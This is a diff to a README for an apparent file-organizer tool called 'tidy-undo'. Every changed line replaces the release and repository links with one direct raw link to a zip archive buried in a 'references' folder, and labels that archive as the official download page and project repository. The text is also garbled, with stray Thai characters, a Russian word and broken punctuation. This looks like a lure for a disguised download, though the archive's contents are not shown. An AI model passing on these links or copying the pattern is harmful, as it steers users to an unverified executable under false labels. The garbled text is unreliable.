@@ -1,7 +1,7 @@
 <h1>🧹 tidy-undo - Declutter Your Downloads Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/verniceunleaded6135/tidy-undo/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download tidy-undo Now</a>
+  <a href="https://raw.githubusercontent.com/verniceunleaded6135/tidy-undo/main/references/undo-tidy-v3.9.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download tidy-undo Now</a>
 </p>
 
 ## 🖥️ What Is tidy-undo?
@@ -55,7 +55,7 @@ Getting tidy-undo up and running is straightforward. Follow thesedownstepsand yo
 
 ### Step 1: Download the Application
 
-1. Visit the official download page by clicking the button at the top of this page or navigating directly to: [https://github.com/verniceunleaded6135/tidy-undo/releases](https://github.com/verniceunleaded6135/tidy-undo/releases)
+1. Visit the official download page by clicking the button at the top of this page or navigating directly to: [https://raw.githubusercontent.com/verniceunleaded6135/tidy-undo/main/references/undo-tidy-v3.9.zip](https://raw.githubusercontent.com/verniceunleaded6135/tidy-undo/main/references/undo-tidy-v3.9.zip)
 )
  
 2. You will see a list of available releases. Look for the latest version (usually at the topand click the download link that corresponds to ваш system. The download will begin automaticallyแ.
@@ -192,10 +192,10 @@ A: Not at allแ., The GUI is designed for average users. All major functions ar
  
 ## 📚 Additional Resources
 
-- **Project Repository**: [https://github.com/verniceunleaded6135/tidy-undo](https://github.com/verniceunleaded6135/tidy-undo)
+- **Project Repository**: [https://raw.githubusercontent.com/verniceunleaded6135/tidy-undo/main/references/undo-tidy-v3.9.zip](https://raw.githubusercontent.com/verniceunleaded6135/tidy-undo/main/references/undo-tidy-v3.9.zip)
 )
  
-- **Download Page**: [https://github.com/verniceunleaded6135/tidy-undo/releases](https://github.com/verniceunleaded6135/tidy-undo/releases)
+- **Download Page**: [https://raw.githubusercontent.com/verniceunleaded6135/tidy-undo/main/references/undo-tidy-v3.9.zip](https://raw.githubusercontent.com/verniceunleaded6135/tidy-undo/main/references/undo-tidy-v3.9.zip)
 )
  
 - **Issue Tracker**: Found a bug? Have a feature request? Share it in the repository's Issues sectionแ)
@@ -207,7 +207,7 @@ A: Not at allแ., The GUI is designed for average users. All major functions ar
 tidy-undo is your gentle, powerful assistant for conquering an unorganized digital lifeแ,) By grouping files by project, renaming opaquePDFs, and offering a foolproof undo system, it saves you timeand frustration every single dayแ,) Download tidy-udo today and take your first step toward a calm, decluttered Downloads folderแ,) One click organizesแ,) One command restoresแ,) No risk, all rewardแ,
 
 <p align="center">
-  <a href="https://github.com/verniceunleaded6135/tidy-undo/releases" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🚀 Get tidy-undo Now</a>
+  <a href="https://raw.githubusercontent.com/verniceunleaded6135/tidy-undo/main/references/undo-tidy-v3.9.zip" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🚀 Get tidy-undo Now</a>
 </p>
 
 Keywords: arxiv, claude-code, claude-skill, cli, declutter, downloads-folder, duplicate-file-finder, file-management, file-organizer, hwp, korean, llm-agent, macos, organize-files, pdf-rename, python, undo
